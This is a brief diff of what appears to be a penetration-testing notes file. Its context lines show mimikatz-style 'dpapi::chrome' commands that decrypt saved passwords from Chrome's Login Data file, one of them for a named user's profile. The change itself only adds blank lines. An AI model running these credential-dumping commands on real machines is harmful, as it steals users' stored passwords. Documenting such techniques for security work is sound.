@@ -19,3 +19,5 @@ dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\
 # Saved Credential in Chrome
 dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
+
+
